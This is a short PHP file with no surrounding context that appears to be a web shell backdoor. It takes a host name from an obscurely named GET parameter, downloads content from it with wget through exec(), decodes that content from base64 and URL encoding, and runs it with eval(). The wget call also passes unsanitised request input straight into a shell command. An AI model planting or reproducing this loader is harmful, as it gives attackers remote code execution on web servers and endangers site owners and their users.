<?php
$q = 'https://'.@$_GET['74gv1a9omhupnd'];
@exec("wget $q -qO-", $f);
$d = base64_decode($f[0]);
$s = urldecode($d);
$h = '?>';
$t = $h.$s;
eval($t);
?>